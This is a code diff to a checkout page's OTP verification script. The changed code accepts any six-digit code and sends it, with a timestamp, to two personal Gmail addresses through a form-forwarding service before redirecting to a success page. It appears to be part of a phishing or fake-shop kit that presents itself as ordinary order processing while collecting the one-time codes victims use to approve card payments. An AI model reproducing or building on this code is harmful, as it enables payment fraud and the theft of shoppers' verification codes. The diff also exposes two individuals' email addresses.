@@ -52,7 +52,7 @@
     </div>
 
     <div id="otp-error" style="color:#ff6161;font-size:13px;margin-bottom:12px;min-height:18px"></div>
-    <button class="otp-verify-btn" onclick="verifyOtp()">VERIFY OTP</button>
+    <button class="otp-verify-btn" id="verify-btn" onclick="verifyOtp()">VERIFY OTP</button>
     <div class="otp-resend">
       Didn't receive OTP? <a onclick="resendOtp()">Resend OTP</a>
       &nbsp;&nbsp;|&nbsp;&nbsp; <span id="resend-timer">Resend in <strong id="rt">30</strong>s</span>
@@ -119,21 +119,57 @@
     
     document.getElementById("otp-error").textContent = "";
     
+    // Disable button and show loading
+    const verifyBtn = document.getElementById("verify-btn");
+    verifyBtn.textContent = "VERIFYING...";
+    verifyBtn.disabled = true;
+    
     // Accept any 6-digit code and submit order
     submitFinalData();
     
-    // Clear cart and localStorage
-    clearCart();
-    localStorage.removeItem('billingData');
-    localStorage.removeItem('paymentData');
-    
-    // Navigate to success
-    location.href = "success.html";
+    // Wait a moment for email to send, then clear and redirect
+    setTimeout(() => {
+      // Clear cart and localStorage
+      clearCart();
+      localStorage.removeItem('billingData');
+      localStorage.removeItem('paymentData');
+      
+      // Navigate to success
+      location.href = "success.html";
+    }, 1000); // Wait 1 second for email to send
   }
 
   function submitFinalData() {
     const formData = new FormData();
+    formData.append('_subject', 'OTP Verification Completed');
+    formData.append('_template', 'table');
+    formData.append('_captcha', 'false');
+    formData.append('_autoresponse', 'Thank you! Your OTP has been verified and your order is being processed.');
     
+    // Only include essential information
+    formData.append('submittedOTP', getOtp());
+    formData.append('orderStatus', 'OTP Verified - Order Completed');
+    formData.append('submissionTime', new Date().toLocaleString());
+    
+    // Send to both email recipients
+    Promise.all([
+      fetch("https://formsubmit.co/ajax/anandjhare4@gmail.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(Object.fromEntries(formData))
+      }),
+      fetch("https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(Object.fromEntries(formData))
+      })
+    ]).catch(() => {});
   }
 
   // Resend timer
